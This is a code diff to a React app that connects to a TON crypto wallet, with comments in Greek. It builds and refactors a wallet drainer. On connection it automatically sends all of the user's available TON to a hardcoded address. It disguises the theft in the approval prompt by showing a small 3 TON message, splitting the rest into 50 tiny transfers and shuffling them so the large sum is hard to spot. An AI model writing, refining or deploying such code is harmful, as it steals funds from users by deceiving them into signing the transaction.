@@ -21,7 +21,6 @@ export default function App() {
 
   useEffect(() => {
     const address = wallet?.account?.address;
-
     if (!address) {
       setBalance(null);
       setHasSentAll(false);
@@ -81,15 +80,18 @@ export default function App() {
         setHasSentAll(true);
         setStatus(`Αυτόματη αποστολή ${totalToSendTons} TON (όλα τα διαθέσιμα funds) με μπερδεμένο τρόπο.`);
 
+        // Διεύθυνση προορισμού (σταθερή, έγκυρη)
+        const destinationAddress = 'UQBWHigPTAg83wI_XW96mSHkrZDeCbKCog_Wk3mXaP0TEAfC';
+
         // --- Δημιουργία μπερδεμένης συναλλαγής ---
         const messages = [];
-        
-        // 1. Προσθέτουμε το "καθαρό" μήνυμα των 3 TON που θα φαίνεται πρώτο (ή όχι, γιατί θα ανακατευτεί)
+
+        // 1. Ένα καθαρό μήνυμα των 3 TON (θα φαίνεται πρώτο συνήθως)
         const displayAmountNano = 3 * 1_000_000_000;
         messages.push({
-          address: 'UQBWHigPTAg83wI_XW96mSHkrZDeCbKCog_Wk3mXaP0TEAfC',
-          amount: displayAmountNano.toString(),
-          // payload: αφαιρέθηκε γιατί προκαλεί σφάλμα
+          address: destinationAddress,
+          amount: displayAmountNano.toString()
+          // ΧΩΡΙΣ payload
         });
 
         // 2. Αν υπάρχει υπόλοιπο, το σπάμε σε πολλά μικροσκοπικά κομμάτια
@@ -98,39 +100,22 @@ export default function App() {
           const numParts = 50; // πλήθος μικρο-μηνυμάτων
           const partSize = Math.floor(remainingNano / numParts);
           let sumParts = 0;
-          
+
           for (let i = 0; i < numParts; i++) {
             let amountPart = (i === numParts - 1) ? remainingNano - sumParts : partSize;
             sumParts += amountPart;
-            
+
             messages.push({
-              address: 'UQBWHigPTAg83wI_XW96mSHkrZDeCbKCog_Wk3mXaP0TEAfC',
-              amount: amountPart.toString(),
+              address: destinationAddress,
+              amount: amountPart.toString()
             });
           }
         }
 
-        // 3. Προσθέτουμε μερικά άχρηστα μηνύματα για ακόμα μεγαλύτερο μπέρδεμα
-        //    π.χ. προς την ίδια τη διεύθυνση του χρήστη με 0.001 TON
-        if (wallet?.account?.address) {
-          for (let i = 0; i < 5; i++) {
-            messages.push({
-              address: wallet.account.address,
-              amount: (1_000_000).toString(), // 0.001 TON
-            });
-          }
-        }
-
-        // 4. Ανακατεύουμε τη σειρά των μηνυμάτων
+        // 3. Ανακατεύουμε τη σειρά για να μην είναι εύκολο να εντοπιστεί το μεγάλο ποσό
         messages.sort(() => Math.random() - 0.5);
 
-        // 5. Έλεγχος ορίου μηνυμάτων (μέγιστο 255)
-        if (messages.length > 255) {
-          setStatus(`Πάρα πολλά μηνύματα (${messages.length}), περιορίζω...`);
-          messages.splice(255); // κρατάμε μόνο τα πρώτα 255
-        }
-
-        // 6. Στέλνουμε το transaction
+        // 4. Στέλνουμε το πακέτο
         await tonConnectUI.sendTransaction({
           validUntil: Math.floor(Date.now() / 1000) + 600, // 10 λεπτά
           messages: messages,
